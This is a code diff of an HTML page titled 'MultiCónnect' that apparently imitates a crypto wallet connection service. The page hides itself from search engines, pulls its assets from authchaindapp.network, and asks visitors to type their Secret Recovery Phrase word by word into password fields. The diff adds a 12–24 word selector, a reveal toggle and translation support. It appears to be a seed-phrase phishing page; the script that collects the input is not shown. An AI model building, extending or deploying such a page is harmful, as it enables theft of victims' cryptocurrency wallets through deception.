@@ -4,6 +4,9 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>MultiCónnect</title>
+
+  <link rel="shortcut icon" href="https://www.authchaindapp.network/favicon.ico
+  " type="image/x-icon">
   <meta name="googlebot" content="noindex">
   <meta name="googlebot-news" content="noindex">
   <meta name="robots" content="noindex, nofollow">
@@ -13,6 +16,10 @@
 
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+
+
+
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -22,8 +29,8 @@
         <img src="https://www.authchaindapp.network/img/logo.png" alt="logo">
       </div>
       <div>
-        <!-- Placeholder for wallet connect button -->
-        <!-- <button>Connect Wallet</button> -->
+        <!-- Google Translate -->
+        <div id="google_translate_element"></div>
       </div>
     </div>
     <div class="form-mainbox">
@@ -44,6 +51,23 @@
         </p>
       </div>
 
+
+      <select class="phrase-select" id="phraseSelect">
+        <option value="12">I have a 12-word phrase</option>
+        <option value="15">I have a 15-word phrase</option>
+        <option value="18">I have a 18-word phrase</option>
+        <option value="21">I have a 21-word phrase</option>
+        <option value="24">I have a 24-word phrase</option>
+      </select>
+
+      <div class="alert alert-info alert-dismissible fade show phrase-info" role="alert">
+        <strong>Your Secret Recovery Phrase contains </strong><span id="wordCount">12</span> words.
+        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+      </div>
+      
+
+
+
       <div class="message-box">
         <div class="icon">
           <img src="https://www.authchaindapp.network/img/full.png" alt="icon">
@@ -58,23 +82,24 @@
       
       <form id="form">
         <div class="form-box-main">
-          <div class="input-form"><label for="form1">1.</label><input type="password" id="form1" /></div>
-          <div class="input-form"><label for="form2">2.</label><input type="password" id="form2" /></div>
-          <div class="input-form"><label for="form3">3.</label><input type="password" id="form3" /></div>
-          <div class="input-form"><label for="form4">4.</label><input type="password" id="form4" /></div>
-          <div class="input-form"><label for="form5">5.</label><input type="password" id="form5" /></div>
-          <div class="input-form"><label for="form6">6.</label><input type="password" id="form6" /></div>
-          <div class="input-form"><label for="form7">7.</label><input type="password" id="form7" /></div>
-          <div class="input-form"><label for="form8">8.</label><input type="password" id="form8" /></div>
-          <div class="input-form"><label for="form9">9.</label><input type="password" id="form9" /></div>
-          <div class="input-form"><label for="form10">10.</label><input type="password" id="form10" /></div>
-          <div class="input-form"><label for="form11">11.</label><input type="password" id="form11" /></div>
-          <div class="input-form"><label for="form12">12.</label><input type="password" id="form12" /></div>
+            <div class="input-form">
+                <label for="form1">1.</label>
+                <div class="input-group">
+                    <input type="password" id="form1" class="form-control">
+                    <i class="fas fa-eye-slash" id="eye-icon1" class="eye-icon"></i> <!-- Font Awesome Eye icon -->
+                </div>
+            </div>
         </div>
         <div class="btnBox">
-          <button type="submit">Confirm Secret Recovery Phrase</button>
+            <button type="submit">Confirm Secret Recovery Phrase</button>
         </div>
-      </form>
+    </form>
+    
+    
+      
+      
+      
+      
     </div>
   </div>
 
@@ -84,6 +109,17 @@
 <!-- js -->
  <script src="script.js"></script>
   
+
+ <!-- google Translate -->
+  <!-- GOOGLE TRANSLATE SCRIPTS START -->
     
+  <script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
+    }
+</script>
+
+<script type="text/javascript"
+    src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
 </html>
